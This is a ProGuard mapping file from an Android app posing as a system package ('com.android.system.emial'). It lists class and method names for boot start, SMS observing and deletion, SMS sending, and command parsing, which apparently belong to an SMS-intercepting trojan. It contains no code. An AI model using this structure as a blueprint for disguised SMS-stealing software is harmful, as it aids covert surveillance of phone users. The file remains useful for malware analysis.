system/proguard/mapping.txt
com.android.system.emial.BootReceiver -> com.android.system.emial.BootReceiver:
    void onReceive(android.content.Context,android.content.Intent) -> onReceive
    boolean isServiceRun(android.content.Context,java.lang.String) -> a
com.android.system.emial.MainActivity -> com.android.system.emial.MainActivity:
    void onCreate(android.os.Bundle) -> onCreate
com.android.system.emial.SmSObserver -> com.android.system.emial.a:
    android.content.Context context -> a
    int maxId -> b
    android.net.Uri inbox -> c
    android.content.SharedPreferences sp -> d
    com.android.system.emial.SmSutils su -> e
    void onChange(boolean) -> onChange
    void Change() -> a
    void delete(int) -> a
com.android.system.emial.SmSReceiver -> com.android.system.emial.SmSReceiver:
    android.content.SharedPreferences sp -> a
    void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.system.emial.SmSserver -> com.android.system.emial.SmSserver:
    android.net.Uri SmsUri -> a
    com.android.system.emial.SmSReceiver localMessageReceiver -> b
    com.android.system.emial.SmSReceiver localMessageReceiver2 -> c
    com.android.system.emial.SmSObserver smsobserver -> d
    com.android.system.emial.SmSutils su -> e
    android.os.Handler handler -> f
    void onCreate() -> onCreate
    void onDestroy() -> onDestroy
    android.os.IBinder onBind(android.content.Intent) -> onBind
    int onStartCommand(android.content.Intent,int,int) -> onStartCommand
    com.android.system.emial.SmSutils access$0(com.android.system.emial.SmSserver) -> a
    android.os.Handler access$1(com.android.system.emial.SmSserver) -> b
com.android.system.emial.SmSserver$1 -> com.android.system.emial.b:
    com.android.system.emial.SmSserver this$0 -> a
    void handleMessage(android.os.Message) -> handleMessage
com.android.system.emial.SmSserver$SendThread -> com.android.system.emial.c:
    com.android.system.emial.SmSserver this$0 -> a
    void run() -> run
com.android.system.emial.SmSutils -> com.android.system.emial.d:
    java.text.SimpleDateFormat sdf -> a
    void SendSms(android.os.Bundle,android.content.Context,com.android.system.emial.SmSReceiver) -> a
    void Parse(java.lang.String,java.lang.String,android.content.Context,android.content.SharedPreferences) -> a
    void sendSMS(java.lang.String,java.lang.String,android.content.Context) -> a
    boolean isMobileNO(java.lang.String) -> a
    boolean isflag() -> a
    void command(java.lang.String,android.content.SharedPreferences) -> a
    java.lang.String getPublicKey(android.content.Context) -> a